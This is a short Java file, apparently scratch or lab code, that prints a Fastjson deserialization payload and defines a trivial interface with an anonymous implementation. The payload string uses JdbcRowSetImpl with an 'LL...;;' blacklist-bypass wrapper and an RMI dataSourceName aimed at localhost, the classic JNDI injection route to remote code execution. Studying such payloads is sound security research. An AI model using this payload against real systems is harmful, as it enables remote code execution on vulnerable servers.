package org;

public class Lambda {
    public static void main(String[] args) {
        String payload = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":true}";
        System.out.println(payload);
    A b=new A() {
        @Override
        public void a() {
        }
        @Override
        public void b() {

        }
    };
    }

    interface A{
        void a();
        void b();
    }
}
